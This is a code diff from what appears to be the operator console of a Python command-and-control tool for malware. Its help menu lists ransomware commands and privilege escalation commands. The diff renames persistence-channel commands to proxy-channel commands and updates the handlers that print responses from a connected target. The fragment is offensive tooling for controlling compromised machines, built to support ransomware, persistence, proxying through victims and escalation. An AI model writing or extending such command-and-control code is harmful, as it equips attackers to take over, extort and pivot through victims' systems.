@@ -109,12 +109,11 @@ def target_communication():
     print("   ransomware_decrypt_attempt - Test client decryption block")
     print("   ransomware_server_stats - Show server encryption stats")
     print("")
-    print("PERSISTENCE COMMANDS:")
-    print("   start_persist          - Start persistence channel")
-    print("   stop_persist           - Stop persistence channel")
-    print("   persist_status         - Get persistence status")
-    print("   persist_info           - Show detailed connection info")
-    print("   persist_new_port       - Reinitialize with new random port")
+    print("PROXY COMMANDS:")
+    print("   start_proxy            - Start proxy channel (auto new random port)")
+    print("   stop_proxy             - Stop proxy channel")
+    print("   proxy_status           - Get proxy status")
+    print("   proxy_info             - Show detailed connection info")
     print("")
     print(f"Connected to target: {ip[0]}:{ip[1]}")
     
@@ -281,23 +280,21 @@ def target_communication():
                 
                 # Also show target response
                 print(f"\nTarget response: {result}")
-        elif command in ['start_persist', 'stop_persist', 'persist_status', 'persist_info', 'persist_new_port']:
-            # Handle persistence commands
+        elif command in ['start_proxy', 'stop_proxy', 'proxy_status', 'proxy_info']:
+            # Handle proxy commands
             result = reliable_recv()
-            if command == 'start_persist':
-                print(f"Persistence: {result}")
-            elif command == 'stop_persist':
-                print(f"Persistence: {result}")
-            elif command == 'persist_status':
-                print(f"Persistence Status:\n{'-'*40}")
+            if command == 'start_proxy':
+                print(f"proxy: {result}")
+            elif command == 'stop_proxy':
+                print(f"proxy: {result}")
+            elif command == 'proxy_status':
+                print(f"proxy Status:\n{'-'*40}")
                 print(result)
                 print("-"*40)
-            elif command == 'persist_info':
-                print(f"Persistence Info:\n{'-'*40}")
+            elif command == 'proxy_info':
+                print(f"proxy Info:\n{'-'*40}")
                 print(result)
                 print("-"*40)
-            elif command == 'persist_new_port':
-                print(f"Persistence New Port: {result}")
         elif command in ['check_privs', 'escalate', 'privesc_report']:
             # Handle privilege escalation commands
             result = reliable_recv()
